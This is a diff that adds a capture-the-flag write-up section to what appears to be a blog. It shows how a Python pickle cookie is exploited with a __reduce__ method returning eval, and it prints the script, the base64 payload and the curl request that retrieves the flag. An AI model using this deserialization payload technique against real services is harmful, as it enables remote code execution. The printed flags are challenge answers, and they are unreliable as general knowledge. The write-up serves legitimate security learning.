@@ -213,3 +213,34 @@ And then the flag will appear as the output in the console.
 ![Flag!](/images/WH03c.png)
 
 Flag: rANDom_VICTORy_113
+
+# WX01
+```
+Visit the site at https://ggcs-wx01.allyourbases.co and find a way to get the flag.
+
+There's a variable called 'flag' but good luck getting to it! This is a super serious challenge.
+```
+The website hints at some serialization it seems.
+We can see a cookie when once we submit, and it appears to be in pickle format.
+So, we see what we can do with that.
+There is a method with pickling called `__reduce__`, which gets called when it is pickled. This method is able to hold a tuple which contains instructions for unpickling.
+We can then try and make it return the flag variable instead with eval.
+It took a couple tries and tweaking, but I ended up making this script, which will return the flag variable if we send this as the userdata.
+
+```
+import pickle
+import codecs
+class thing(object):
+        def __reduce__(self):
+                return (eval, ("dict({'name':flag})",))
+
+pickled = codecs.encode(pickle.dumps(thing()), "base64").decode()
+
+print(pickled)
+```
+This gives us the `userdata` variable we need to send to get the flag
+`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wx01 -d '{"userdata":"Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiZGljdCh7J25hbWUnOmZsYWd9KSIKcDEKdHAyClJwMwou"}'
+`
+![Flag.](/images/WX01.png)
+
+Flag: suPER_SeRiAL-bR0_02891
